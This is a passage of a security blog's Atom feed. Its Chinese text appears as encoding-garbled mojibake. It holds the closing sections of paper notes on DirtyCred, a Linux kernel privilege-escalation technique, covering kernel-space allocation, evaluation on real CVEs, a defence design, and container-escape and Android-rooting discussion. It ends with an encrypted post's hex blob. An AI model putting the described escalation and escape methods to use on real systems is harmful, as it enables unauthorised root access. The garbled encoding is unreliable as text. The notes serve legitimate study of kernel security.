·çš„ç¨‹åºåŒ…æ‹¬ sudoã€pkexec ç­‰</p><p>DirtyCred é™¤äº†æ›¿æ¢ <code>cred</code> å¯¹è±¡ä»¥å¤–ä¹Ÿå¯ä»¥é€šè¿‡æ›¿æ¢ <code>file</code> å¯¹è±¡æ¥ææƒï¼Œä¸è¿‡ <code>file</code> å¯¹è±¡çš„åˆ†é…è¿œæ¯” <code>cred</code> å®¹æ˜“ï¼Œä»¥å¯¹åº”æƒé™æ‰“å¼€æ–‡ä»¶å³å¯</p><h2 id="6-2-Allocation-from-Kernel-Space"><a href="#6-2-Allocation-from-Kernel-Space" class="headerlink" title="6.2  Allocation from Kernel Space"></a>6.2  Allocation from Kernel Space</h2><p>é™¤äº†ä»ç”¨æˆ·ç©ºé—´åˆ†é…ç‰¹æƒå¯¹è±¡ä»¥å¤–ï¼ŒDirtyCred ä¹Ÿå¯ä»¥ä»å†…æ ¸ç©ºé—´åˆ†é…ç‰¹æƒå¯¹è±¡ï¼Œå¦‚ç”Ÿæˆæ–°çš„ç‰¹æƒå†…æ ¸çº¿ç¨‹å®Œæˆç‰¹æƒå‡­è¯å¯¹è±¡çš„åˆ†é…ï¼Œä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ul><li>è°ƒç”¨å†…æ ¸ä»£ç è§¦å‘å†…æ ¸åœ¨å†…éƒ¨ç”Ÿæˆç‰¹æƒçº¿ç¨‹ï¼Œå¦‚é€šè¿‡å‘ <a href="https://docs.kernel.org/core-api/workqueue.html">å·¥ä½œé˜Ÿåˆ—</a> æäº¤ä»»åŠ¡è®©å†…æ ¸åˆ›å»ºæ–°çš„å·¥ä½œè€…çº¿ç¨‹</li><li>å”¤é†’ usermode helperï¼Œå¦‚é€šè¿‡åŠ è½½å†…æ ¸æ¨¡å—æ¥è®©å†…æ ¸å¯åŠ¨ç‰¹æƒç”¨æˆ·æ€ usermode helper ç¨‹åºï¼ˆå¦‚ modprobeï¼‰</li></ul><h1 id="0x07-Evaluation"><a href="#0x07-Evaluation" class="headerlink" title="0x07. Evaluation"></a>0x07. Evaluation</h1><p>ä½œè€…è®¾è®¡äº†ä¸¤ä¸ªå®éªŒæ¥åœ¨çœŸå®ä¸–ç•Œæ¼æ´ä¸Šè¯„ä¼° DirtyCred</p><h2 id="7-1-Experiment-Design-amp-Setup"><a href="#7-1-Experiment-Design-amp-Setup" class="headerlink" title="7.1 Experiment Design &amp; Setup"></a>7.1 Experiment Design &amp; Setup</h2><p>ä½œè€…å¼•å…¥äº†ä¸€ç§è‡ªåŠ¨åŒ–æ–¹æ³•ï¼ˆè®¾è®¡å®ç°å‚è§é™„å½• Aï¼‰å¯»æ‰¾å¯ä¾› DirtyCred åˆ©ç”¨çš„å†…æ ¸å¯¹è±¡ï¼Œå¹¶åº”ç”¨äº 5.16.15 ç‰ˆæœ¬çš„å†…æ ¸</p><p>ä½œè€…è¿˜æ¢è®¨äº†é’ˆå¯¹å®é™…æ¼æ´åˆ©ç”¨çš„å¯è¡Œæ€§ï¼Œå¦‚ç¬¬ 4 èŠ‚æ‰€è¨€ï¼Œè‹¥æ¼æ´æœªç›´æ¥æä¾›äº¤æ¢å‡­è¯ç»“æ„ä½“çš„èƒ½åŠ›ï¼Œåˆ™éœ€è¦æˆ‘ä»¬è¿›è¡Œè½¬æ¢</p><p>ä½œè€…å‡è®¾ Linux å†…æ ¸ä½¿ç”¨å…¶æœ€å…ˆè¿›çš„é˜²æŠ¤æ‰‹æ®µï¼Œå¹¶åœ¨è¯„ä¼°ä¸­ä»…é€‰æ‹© 2019 å¹´ä»¥åçš„ CVEï¼Œæ•°æ®é›†å¦‚è¡¨ 2 æ‰€ç¤ºï¼Œè¿™æ¶µç›–äº†å‡ ä¹æ‰€æœ‰çš„å †ä¸Šæ¼æ´ç±»å‹</p><h2 id="7-2-Experiment-Result"><a href="#7-2-Experiment-Result" class="headerlink" title="7.2 Experiment Result"></a>7.2 Experiment Result</h2><p><strong>å¯åˆ©ç”¨å¯¹è±¡</strong>ã€‚è¡¨ 1 å±•ç¤ºäº†ä¸åŒç¼“å­˜æ± ä¸­å¯ä»¥è¢«åˆ©ç”¨çš„å†…æ ¸å¯¹è±¡ï¼Œå‡ ä¹æ‰€æœ‰é€šç”¨ç¼“å­˜æ± ï¼ˆé™¤äº† <code>kmalloc-8</code> ï¼‰éƒ½æœ‰å¯ä¾› DirtyCred åˆ©ç”¨å¯¹è±¡ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230204803.png"></p><p><strong>å¯åˆ©ç”¨æ€§</strong>ã€‚è¡¨ 2 æ˜¾ç¤ºäº† DirtyCred åœ¨ä¸åŒæ¼æ´ä¸Šçš„å¯åˆ©ç”¨æ€§ï¼Œåœ¨å¼€å¯æ‰€æœ‰é˜²æŠ¤çš„æƒ…å†µä¸‹å…¶åœ¨ 24 ä¸ªæ¼æ´ä¸­çš„ 16 ä¸ªä¸Šéƒ½å®Œæˆäº†åˆ©ç”¨ï¼Œè¿™è¡¨æ˜äº†å…¶é€šç”¨æ€§ä¸å¼ºå¤§</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230205513.png"></p><blockquote><p>è¿˜æœ‰ä¸€äº›å…³äºåˆ©ç”¨å¤±è´¥çš„é˜è¿°ï¼Œè¿™é‡Œç¬”è€…å°±ä¸æŠ„äº†</p></blockquote><h1 id="0x08-Defence-Against-DirtyCred"><a href="#0x08-Defence-Against-DirtyCred" class="headerlink" title="0x08. Defence Against DirtyCred"></a>0x08. Defence Against DirtyCred</h1><p>ç°æœ‰å„ç§é˜²æŠ¤ä¸»è¦é’ˆå¯¹æ§åˆ¶æµåŠ«æŒï¼Œéš¾ä»¥å¯¹æŠ— DirtyCredï¼Œä½œè€…è®¤ä¸ºä¸€ç§æœ‰æ•ˆçš„å¯¹æŠ—æ–¹å¼æ˜¯éš”ç¦»é«˜æƒé™ä¸ä½æƒé™å¯¹è±¡ï¼Œæ¯”è¾ƒç›´æ¥çš„æƒ³æ³•æ˜¯åˆ›å»ºä¸åŒçš„ç¼“å­˜æ± ï¼Œä½†è¿™ä»èƒ½é€šè¿‡è·¨ç¼“å­˜çš„é¡µå›æ”¶å®Œæˆåˆ©ç”¨</p><p>åŸºäºä¸Šè¿°è€ƒè™‘ï¼Œä½œè€…è®¾è®¡çš„è§£å†³æ–¹æ¡ˆæ˜¯ä¸ºé«˜æƒé™å¯¹è±¡åœ¨è™šæ‹Ÿå†…å­˜åŒºåŸŸåˆ›å»ºä¸€ä¸ªç¼“å­˜ï¼ˆåˆ›å»ºçš„å‡­è¯å¯¹è±¡ ID ä¸º <code>GLOBAL_ROOT_UID</code> æ—¶æˆ–ä»¥å†™æƒé™æ‰“å¼€æ–‡ä»¶æ—¶åˆ™ä½¿ç”¨ vmalloc åˆ†é…ï¼‰ï¼ŒåŒæ—¶ä½æƒé™å¯¹è±¡ä¿ç•™åœ¨æ­£å¸¸å†…å­˜åŒºåŸŸï¼Œä»è€Œéš”ç¦»å¼€å†…å­˜é¡µï¼›ä½†è¿è¡Œæ—¶æƒé™æ›´æ”¹ï¼ˆå¦‚ setuid ç³»ç»Ÿè°ƒç”¨ï¼‰ä»èƒ½ç ´åè¿™ç§æœºåˆ¶ï¼Œä½œè€…çš„è§£å†³æ–¹æ¡ˆæ˜¯ä¸ºæ›´æ”¹æ“ä½œæ·»åŠ æ£€æŸ¥ï¼Œè‹¥æ˜¯æ”¹ä¸º <code>GLOBAL_ROOT_UID</code> åˆ™å°†é«˜æƒé™å‡­è¯å¯¹è±¡å¤åˆ¶åˆ° vmalloc åŒºåŸŸè€Œéæ›´æ”¹åŸå§‹å¯¹è±¡ï¼Œä½†è¿™éœ€è¦æœªæ¥çš„å†…æ ¸å¼€å‘éµå¾ªç›¸åŒçš„æ¨¡å¼ï¼Œå› æ­¤ä½œè€…ä»åœ¨æ¢ç´¢æ›¿ä»£è§£å†³æ–¹æ¡ˆ</p><p>æ€§èƒ½è¯„ä¼°ç»“æœå¦‚è¡¨ 3 æ‰€ç¤ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231230210827.png"></p><p>åœ¨è¿™é¡¹å·¥ä½œä¸­ï¼Œä½œè€…ç§°å…¶ä¸»è¦ç›®æ ‡æ˜¯æé«˜Linuxç¤¾åŒºçš„æ„è¯†ï¼Œè€Œä¸æ˜¯æ„å»ºä¸€ä¸ªå®‰å…¨ã€é«˜æ•ˆçš„é˜²å¾¡è§£å†³æ–¹æ¡ˆï¼Œä¸”ä½œè€…å°†æ¢ç´¢æ›¿ä»£é˜²å¾¡è§£å†³æ–¹æ¡ˆä½œä¸ºæœªæ¥ç ”ç©¶çš„ä¸€éƒ¨åˆ†</p><h1 id="0x09-Related-Work"><a href="#0x09-Related-Work" class="headerlink" title="0x09. Related Work"></a>0x09. Related Work</h1><p>è¿™ä¸€èŠ‚ä¸»è¦ä»‹ç»ä¸è®ºæ–‡ç›¸å…³çš„ä¸¤æ–¹é¢å·¥ä½œâ€”â€”å†…æ ¸åˆ©ç”¨ï¼ˆexploitationï¼‰ä¸å†…æ ¸é˜²æŠ¤ï¼ˆdefenceï¼‰ï¼Œéƒ½æ˜¯å¸¸è¯†æ€§å†…å®¹æ‰€ä»¥è¿™é‡Œç¬”è€…å°±ä¸æ‘˜æŠ„äº†ï¼šï¼‰</p><h1 id="0x10-Discussion-amp-Future-Work"><a href="#0x10-Discussion-amp-Future-Work" class="headerlink" title="0x10. Discussion &amp; Future Work"></a>0x10. Discussion &amp; Future Work</h1><p>è¿™èŠ‚è®¨è®ºä¹‹å‰æ²¡æåˆ°çš„ä¸€äº›ç‚¹ï¼š</p><ul><li><p><strong>Escaping container.</strong> å®¹å™¨ä¸­çš„æ–‡ä»¶å¹¶ä¸æä¾›äº¤æ¢å‘½åç©ºé—´çš„èƒ½åŠ›ï¼Œä½†<a href="https://www.datadoghq.com/blog/engineering/dirty-pipe-container-escape-poc/">ä¸€é¡¹æœ€è¿‘çš„ç ”ç©¶</a>æ˜¾ç¤ºæ”»å‡»è€…å¯ä»¥è¢«åŠ¨ç­‰å¾… runC è¿›ç¨‹ï¼Œç”±æ­¤å¯ä»¥é€šè¿‡è¦†å†™è¿›ç¨‹æ¥åœ¨ host ä¾§ä»¥ root è¿è¡Œå‘½ä»¤ï¼ŒDirtyCred å¯ä»¥ä»¥æ­¤å®Œæˆå®¹å™¨é€ƒé€¸ï¼›åˆ©ç”¨ cred å¯¹è±¡åˆ™ä¸éœ€è¦è¢«åŠ¨ç­‰å¾…ï¼Œé€šè¿‡äº¤æ¢ cred è·å¾— <code>SYS_ADMIN</code> æƒé™ä½¿å¾—æ”»å‡»è€…å¯ä»¥æŒ‚è½½ cgroup ååˆ©ç”¨ <code>notify_no_release</code> æœºåˆ¶æ¥åœ¨ host ä¾§ä»¥ root æ‰§è¡Œå‘½ä»¤ï¼Œä½œè€…åœ¨<a href="https://hackmd.io/giRE2P2oQHektZzOG053IQ">è¿™é‡Œ</a>ç»™å‡ºäº†æ¡ˆä¾‹</p></li><li><p><strong>Rooting Android.</strong> å®‰å“ä¹Ÿæ˜¯ Linux å†…æ ¸ï¼ŒDirtyCred å¯ä»¥é€šè¿‡æ–‡ä¸­è®¨è®ºçš„ä¸¤ç§æ–¹å¼å®Œæˆå®‰å“ææƒï¼Œä¸è¿‡å®æˆ˜ä¸­å®‰å“å†…æ ¸æœ‰ç€æ›´ä¸¥æ ¼çš„è®¿é—®é™åˆ¶ï¼Œç›´æ¥äº¤æ¢ cred æ˜¯å¯è¡Œçš„ï¼Œå¯¹äºæ–‡ä»¶è€Œè¨€å¯ä»¥é¦–å…ˆè¦†å†™å…±äº«åº“ä»¥å®Œæˆæ²™ç®±é€ƒé€¸ï¼Œä¹‹åå†è¦†å†™å†…æ ¸æ¨¡å—ï¼Œä½œè€…åœ¨ 0day æ¼æ´ä¸Šç”¨ DirtyCred å®Œæˆäº†åˆ©ç”¨å¹¶è·å¾—æ›´Google çš„è‡´è°¢</p></li><li><p><strong>Cross version&#x2F;architecture exploitation.</strong> DirtyCred çš„åˆ©ç”¨æ˜¯è·¨ç‰ˆæœ¬è·¨æ¶æ„çš„ï¼Œå› ä¸ºå…¶åŸºæœ¬ä¸éœ€è¦å†…æ ¸ä¿¡æ¯ï¼Œä¹Ÿä¸éœ€è¦ç‰¹å®šäºæ¶æ„çš„æ•°æ®</p></li><li><p><strong>Other way to pivot capability.</strong> è™šæ‹Ÿå†…å­˜åŒºä¸Šçš„æ¼æ´æ›´éš¾è¢«è½¬åŒ–ä¸º DirtyCredï¼Œä½†ä¸æ„å‘³ç€æ— æ³•ä½¿ç”¨ DirtyCredï¼Œå¦‚<a href="https://github.com/HexRabbit/CVE-writeup/tree/master/CVE-2021-34866">è¿™ä¸ªå·¥ä½œ</a>å°† vmalloc åŒºä¸Šçš„è¶Šç•Œå†™æ¼æ´ CVE-2021-34866 è½¬ä¸ºä»»æ„å†…å­˜è¯»å†™</p></li><li><p><strong>Stability.</strong> ç¨³å®šæ€§ä¸»è¦å—å†…å­˜å¸ƒå±€ä¸æ¼æ´è§¦å‘æ–¹å¼å½±å“ï¼Œ<a href="https://www.usenix.org/conference/usenixsecurity22/presentation/zeng">æœ€è¿‘çš„ä¸€ä¸ªå·¥ä½œ</a>æå‡ºäº†ä¸€ç³»åˆ—æ–¹æ³•æé«˜åˆ©ç”¨ç¨³å®šæ€§</p></li><li><p><strong>TOCTOU.</strong> ï¼ˆTime-Of-Check to Time-of-Useï¼‰ DirtyCred åœ¨å…³é”®æ—¶é—´çª—å£äº¤æ¢å‡­è¯å¯¹è±¡ï¼Œç›´è§‰å‘Šè¯‰æˆ‘ä»¬ç°æœ‰çš„ TOCTOU é˜²å¾¡æ–¹æ³•å¯èƒ½ä¼šé˜»ç¢ DirtyCredï¼Œä½†é’ˆå¯¹<a href="https://ieeexplore.ieee.org/document/9718065/">æœ€è¿‘ä¸€ç¯‡å…³äº TOCTOU çš„ç ”ç©¶æ–‡ç« </a>åˆ†æï¼Œå®é™…ä¸Šå¹¶ä¸ä¼šï¼Œå› ä¸º DirtyCred ä½¿ç”¨äº†æ„å¤–çš„é‡Šæ”¾æ“ä½œï¼Œè€Œè¿™åœ¨å„ç§åˆ†æè¿‡ç¨‹ä¸­ä¸å¯è§</p></li></ul><h1 id="0x11-Conclusion"><a href="#0x11-Conclusion" class="headerlink" title="0x11. Conclusion"></a>0x11. Conclusion</h1><p>ä½œè€…å¼€å‘äº† Linux å†…æ ¸é€šç”¨åˆ©ç”¨æ‰‹æ³• DirtyCredï¼Œå¾ˆå¥½å¾ˆå¼ºå¤§ï¼Œæ’’èŠ±~ğŸŒ¸ğŸŒ¸ğŸŒ¸</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ–°ç“¶è£…æ—§é…’çš„ 114514 ç§å†™æ³•&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Kernel UAF" scheme="https://arttnba3.github.io/tags/Kernel-UAF/"/>
    
    <category term="Heap Overflow" scheme="https://arttnba3.github.io/tags/Heap-Overflow/"/>
    
    <category term="è®ºæ–‡ç¬”è®°" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ã€PIECES.0x05ã€‘è¿‡é‡ç”µæ³¢é‡åº¦ä¾èµ–ï¼šå†åˆ«ç”µä¸“</title>
    <link href="https://arttnba3.github.io/2023/12/21/PIECES-0X05-NEEDY_A3_OVERDOSE-0-GOODBYE_XDU/"/>
    <id>https://arttnba3.github.io/2023/12/21/PIECES-0X05-NEEDY_A3_OVERDOSE-0-GOODBYE_XDU/</id>
    <published>2023-12-20T19:30:41.000Z</published>
    <updated>2023-12-30T21:38:47.114Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="å¯†ç å‡ºé”™å•¦ï¼ä½†æ˜¯é¢˜ç›®è¿˜æ²¡å‡ºå¥½æ‰€ä»¥æš‚ä¸”è¯·ç­‰å¾…..." data-whm="è¿˜è¯·ä¸è¦åšä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„äº‹æƒ…ï¼">  <script id="hbeData" type="hbeData" data-hmacdigest="4de51144639fa16a8ecbdfa6582d90c8d1f285c11113223e663031ab4ef51287">f4186fb4192fa911fd4cd5c6f8b3def692d6faa5b6d746477cdf302dc764b950561e745c78f1c2766333c32886c5952b6e980ae7cf9867d465b2910ea68de50562b3d6037eb63a410a04c38f48922f102bb2f4b3db916837be31b0411cc81c5bcd8a92d70a5115129535e22060e291d45a9ee6aeb5facae4ca490abfcd362eeb9b4f732a53ed084f4bcec789cd881ff4c5e061e10609c659b0fa03a0059e40c04e7de63cdd73a94cfb68a11991ba5951d7162b02b9755c65e49e6b1f4d013ae0a220731d448c29a2f3da06ddc23308e787f46607e7f90f66a005af1b876ee2d42e9fc90aa80bababaf545fdaaec8467928a580c60b3d93bb14533c398a46f3d1f16d104b2ec855562677e6b0b8e949ffbcde6a581684bd4b3e83400f9d9d9369a047793a9cf039dcbb07a089c872773ad25033b8c8ecd6280d163bd3810aab1ac97d731bef2b25e898ab0ae64e99e1f8bd51fbdd9b7f7e1219137347672122b962819a62d63160ea2c853a130e7c53519c3cca2b7d61c18f427b09f3db01cfa5fdca0080c2d3d78353676b9b495714c5eded101a1a89a210717899a948835d8e41e82715935a5da67588e3fa86fc6fe490a0b7e2b4cbfd1a6ef02a9d68aea9043e6eab7207493412f4e2327205009a76c3afe25dd58b1ed0a0e9308da21b2c2944c916ccc700e3e85a35fce8f2ab7f560dd826205ad5985bca2020a6ecdc56d4a54e3ffa27cdd8db1678b1806ee205ad6c1db5b4d9e4b63da59fbc84ca252e2ae5ebc4556116dd4b6af7e6b3898922ffa8417368c5b0499f744d52de6e05a6b2188b70efa8c2320da88d085a4cdc6779a50f069e6aea4b20f66992d345a4d165cccb6384ad2bf2c8d2122a6912719af6487a14b53f6c46ba6f6a9c769a6a9a75e54de141ddc8c902df0818f1e2fde45a32f32cc809a751f5a61d8161be5f14c9863aee5bf029bb1ca5e09d1c027ec4d10975933845acb5f9b1c4455a73cb256803b1704097de257df417cb9776858370edc1fe614e5a1077704177b11cca54bee14c3745e92605329be1d266e3351d016692f6be7e4f3bf74b77065f45c9b22c1085e535cce4fbcdabcd3348f065df16bda887d6268e2efe6ba74028d77966f31356148da14496374014d2f13d72979fabcfdd900f89806d886349678dd8eecf1ac534e168fcf3089bb3deb767b0653a3dfb12df72b8aa74f9e973bc4eac5282109448887fb0903b7607209bac87f2f0cb54f4997c211d5b6e0829a97df025ec1a7553ddc1c7a7a306dccb0ba72e24d5ef856982ca30838ddefd9bf6ff81a613167f2257a05826b872a0e48aee9b3587cec4768afb8047d49a1ee5efd95f7a2d191d09c744e2a08ecc8153109a8abc2d463634b5a995f46683325ca12debaa92e2ac8acc987e025de95957eab0b6c4e10a67cac2d83432f10fd4a5bbdcb9acd414b61f307d3ce5816d3ac266933635d55897a620c77af283a168e35aad6fc239cf4a74d9f6b61041cad19655b44e95a25490d283584f97f95255624e2e0b3c5fb267142a9b220c402961e0c13478aa0071c2e37e8a87427e899593d99de1e526c9a6c1e08b33c677365c5d7172bf94453255472d0e6127716e58f82dc0cd0a2dcc2ef8d727b39773fb687ce55d70cc80737e7fb3615797b9aead724767f0875b495391d7fc52e0f17bd055a762b0298cab1803844db6eabe401ca24656df5e937485bc28d29f97646f803c2b8ca443f1b7adb8aebedfdb0aee5b25f2bda109cc5e1dbf3563ea274cea92deebfca563f304994e07334a18b96b5537f0e799db3b2f41b4c71c70e0f246f57b9f62391fe6af58cbb1e1bec4dcc656b0cec6ecc377a0903c45b2f783cb1a7cda10d03900b4b51557c6c3099a9997450cba3bdd8b236266ff051d2d5a1071219e5c539d25f5323f4ec9549d2a1e54236fbbff339b9949a61faf7b3957b9749e3d52f85dbd3586aff2f7dbd16efa5d218bb12cda58609f07fb5daaac605fc181210e62a59e24a3428eacf83c5dc09a77c7a34f0d21c0a4d9f747ca383c0fe1f6b49d42fa0b0d6e2aa91eebb0d56928dafe7a570485f5557007194e25cdaa2ad718e2cf9420579f515d6e25c41f4f4f6a88b93a21916f0f13c4d4e4a41b22191cfbb75817cc62b5ff7a4eff9b21ad94c8d23339c33aa215350201f17f4b6fbcac4d977a861ee28e85d7418b2d051d42f1b0918c1069d5a5a75b2a5cc539ca40895e253f4892f3aea327f2417bdba1b0b311ab6a4e27117ea28c6d8d7a1dadb9a28531940bdf1c486b9e456b30e5bf4ad0db01d5ce7868b8d4e5404221c6ab9ad9e0eae15f548208a5979c972ea0f773498fcd85901555fd65c67610940f0dc606422b4bfe77fb5a759f4a9d51cb42c69aec150e93efc5da7c91f17b75543601cf0a64597575d382a6647b20505d8df60470ace9efe6007c8b1753d2c2f4fc05a12e0f0770377e899134221781f6a55e57ee3f62339cb911ed7a59a27a0258303d6da97a63d3356419c454ddad2d9144d05e1d5961d5846aa348f32d70f180b3c7152da00189ae4396b4a5c493f96df14962d3e0cc1295c6183b603d85234c493a1ef4e20ca742d1197714be6cf799b2036acb64bd0cdf0a2b5fa53ba261dd4f42cdedc726f2e29d9f11d80af396c984d97d327878d787bd03238d5d33ab705bf0606c5492af1144ab1b68a60cc4adbc4cc5f8dc13eefdfbd1999c8b2820605f83335a9eb2c0d24cf0abd80d279480995cdc746b8520eab375073dd8b2bca598b2e0eb4452d25a35927637118513ceac3f07d3951bf3bbaabcf2568444021367ca2210faa3ec44ffb76b3dd4c39fc1fd10262df812e872ac31a4cdeedf34fcf52ed5ca9578800c15346c65ed1afe7428f7efc104fc21f74494568cd286e74c4da5042fe3474bb4148ab47d542fa28eef8b995182dd466c3b3789c9166ccfc31afbca1ab79984a092a7ba5ed41c2bc27810516415ce378c142b10f5d394ad6fe3aa46856df4e2f616fdd0af752ee51a7fcda48cc8d31cecad982885027fd979f9bb8428f54a9c2e18e941cc516f0d91d223c41d3a0e5eadb21857f60c2bfc0b23e27bd5b7eac5125fedd2ead215a6424bc686df711e2b599e6d932d8781443a3f70a30d4bac4f6f46209e6f1e46c86903336fa3597ad1736ad398fd228b9b5cf5d89112eeab3d31dd4649509c5d0860639ceeabe4f763ed75fbeeb40ba2510b0e67219622e2897e63067030198200f07f6204d476f7d3ff42e286e81ff145caa4ee372105c36fe1d259254b1867e92387420ab1fac72246c656fc700b84063d92e897ef1be1cc76194c318582a6609748d3d46b335f2465bd8c5f79f6abc64cdbe74d92929d0a02d41af8329e9ab554d26173891fa834aae8f661cd79c3c099b443a55f3f75cb206684414b934001c48d2d6143b23df501291f1b084429f94cdf6e1f4472f11a03251b5ae8b3407769d1928e54d4d98d7591a2f6829f073fed863153edd768b1f9abf324e46b35caae7069da2d69135e996acab192cc37edfa740a8e8a7298968526f167968b5f1d982b334263dbf2b45fa5a92ef9c6a865917decc60883811059a509eeea94fd50a22f57da4b441f79767b964ee84227c3e12be7e40f83a0f492258b705f58f43a1419aa8d0dd4b445e6f0d64ec835bd98cafbe98da4660efedc7535c7f4b7130c870799ddcc0eb7329cd435fb19220695578f5df70ab3f1c34b66703bdda1a5d95dc93c0d68fe1e67b0b830436f531b53efac06f04f1a2264317b8009a98954bc69b9aed254566ee047ea298bab92690da1456afcee4ce04046b1e31072ffe60d2c4227a0427ad5fa7d583f81ff6e179dd2ed088b56b6d92c12b2cf74a4708a61177ad0d79a401f11018f0b95ccc895cda5d0d95c2f5211267cb1dca8ec65f2d4c6ef6e4631ab495daf3b6df014dcd46ff7bbe821d9173f0274935d9e4f922af7efa09566bb8c36678ef733080dd175b1877c862842b9c60d72422f09898e5d62a5d9aa90fe069822d682677445d94c9218312284caae3196ec547fe94e0f0babdd72c12cf5df2b6cd437b6afbb99f3df04059c97207fc9e712f40d21f87ba5396eac1bb72a2f3ec7c61b5d56a7218c9314e3ca851ef29a0116e019cfdafacea22bed6006887e9899e7604549af3dfa3c369eba69f5d2c658a38d6696d3f241419acabe3deccd4e7f16a56cea859588662661db475f40b474b817f663a9180d76671321bd9cce6985b11446cbf7b20e53bcd8a909651be7593027f50f69419584c71299886d29654490f0a9f4656d94f0c33d306adf3cce3189f0d68a64121e2dbda5081070ca9e46bfeca445d051fc907eb57c87f5bf50d5d010ca111b2b596ad9c3829def21ac164345a5426dcfb4ca6f96ebde905c6ad9523c7cdd1a9292d970ff83de75c17e1789b2699298a57f197400b6137770f1a5d4f68229fb5351801e20c1a84320fd17add7a74e842e57aa28a73c70967e3026659f7602799674d74d01e2d646ee3f24ac205df32c832365d49fa4fa957ec2e7a57ac8e2598b071eff7af6bbf58211703b13d70aac6adbf085c05e6d2dbb4e0da3b3d34fe7cd70bb75aa6e4ba96b41fce46748812f7af8a923b4cffcf93c4aae0440aa314d9b84525eb06fff06351e8cd6a7d131b7a321db65da57b3f69e6ce476a23761eb76b1b68ebf09a1c304e5dc6506f7f8c293331f02ce8ccfaae721f3e87d5e22cba372918c1ca3d0cd9568950ae41086db42397e338d483819428a9199d190bf7a497df243f4b199917f4b984bfbb1334b55af2ac91244a490acef477e2a5e93711209454fd2b8db20c4fcd26c65306812bbc9a19fa1149650fda4f7ca538547579a5ff9aa6b290cc32216096b1543a608b089c38f479b05d942d2d4a5f62a2931d4d43eca0317f0dc472e0577e777abc3c3ec2b5bf2f59404134b8d9b7c304d1fd7c22c6a5374972e9f5e76edb986d92c3b584d9212d6e5a27a8188e44097e9066941a0cce13e11942b251fc2468331f77cfef0cfefc94af68a01b65660f0b88d1053c31cdcfbbcb4ca0c13999a201a4ff8404b9e994eae2f56ed4f35400feb266e9b034f4badbb43d7a2fb9f175468b90280464008a5fcd36cd40a0384613a8a0982367c9d0861b118cedf41e79bc394a772c8564922c63329f5642d93dfada5860282f38398102db9dcf56a5255a41f1474be6b3dd499ee37e21d4b20a2047f06aff549d3581109161d21055409638df46e880d9ae850fa55706298f224fcb8b302a0f8443f9f0eec615cbced9c929c983e6e5e8c304b8ae947e45ae3a63c89479d57077f245dc2c3c71c684dae910f509743f3ff0437d2911a95963433b7d2affe5c87f597695abcf046786be073368c60d8655239fccb2c5b9c7d33e7588f4456040ae13f4aeeb234ad6b48560b3d385b3eead790b15a94de381351d17cb51084657d72e9af27d348e5d50a6e7bdff414178d9fa92c47cd30c292c24ecf57e2693a3b74acb3c09b811aca7e496e9f63da490b1b12add2ed1ee709c8d8fd24022e446b27e36cc98d2012a3d4d9e3f696d5dde43381058924665d1580f6a67b5ac3804df7de8896ee313b536ef1b4de3fcc861d852648197efe906c8e84166594b3e77643be2da14aab210bdcc6a44392f96f19302abcf4139bb142ab0a7a351e5944d05e5b0250b5a781d1fe88f8e1c155474a8d134122cf02c820a3f065f5f7b0b547be78ca164fec83f4e80de73b0c975986ebfce9c5c3e386b5f244ab941aa6415bbfb6d7d250b3d137089558c06133d622bf428008b1c866253aba7e8db4d3ea2d3db49f5549a733ac543380ec7374ff31e4f8c4dad3970dc5888c57c363065e586559fc6ac1f64e2cc95d86e95824acf88537d663d3f4193f87c7d184059560072f2ecd0927d8ce0b989b07557c0978409e965cb39370023a7e8affe2a0088382d3b2fb91cd1508b041a1e91268c00ed0cf9adc2482d8f5201489129e53339f04319e8b8b9fb4d3b03719d7404b847dcfe2e7877e1fa32eaa559e1ec553709a9b3b14351398d6abcfd7ca1205596beb93d65b72a4f0b9d5bdf15d45cb41380ec5b36d279f2230e94edc7994759ddfd57b452f641ffc8120c168d09bca3fa43633f1a218f4b8f73a05f6e6660fc3abb57e09a121fb90c93921172f2e5187fbce638f99d8fcb9cfd2243429448471b5d23a012663c4537e8bbadbf5735eeb423d7bc22551675ece2b3c4077df93fd74e5889efcd5a15ad74f922791b6964948ea7e1c19fbfc05743f8545f13144ec0e1d2d26e8936d57b1fb376625e956eb2059758e539f13ea37010abe8956b192534eb3f3924daf152420c0e15050f44ecf45f77e97f652977a3e4257aacbfa87f56324964c8a37aa336fd19d61de0340db9ee6bccbc2f2f7711edb7885c3c5f3cc38e02879f8329fef8e50654dc23823b1997ef97fbb03edffc2b5a9430c016e83b06afd26c837b8782a353206baa94f8580f497cb80849ad8a1e5c26ba99211972a58f8f7a7ab4e193198b5c7c1ccf2010f8fd29d576ff7b79f7576f2bf304a7d796fb22689535234b2c91a2e951c5fa73ba92d7c1add755d60d7e8f535d431d9f5ff3a835cf07620b58b902e4b319ab0d2b10d3f15a2f519143abefaa4e0dccb10c5429330f5696d71ca24b8a7d836dab1e12ef003c3e111a9bc85474cccbf7b6c25ed15e53ba94ff009acee3a556ec76a8d23350812936978c01c6168c3621a812358002e7fa7a138a790432d14beae0d3225cb6e2ed164f87b7c568863e48e02e2fc7258fd1304c0097eac8268ab17d9358abe90762a121b49e4aba1afaa1aabd221575f421763bd732429d91ee8b2eb3d4a13bb03da9455ee161d888ef6c0b7fada2feb8bf704079d2b9f9074311c2a200662780138d3be57a45c13f78f590a0f1c0396574df1044d4e8443e94d5cfc057f90307b00abde2e93b47067369a27ed7e7cde831e9f590abb22ffa5444cc5699434909a0b9e405666b2dcad7faeaacf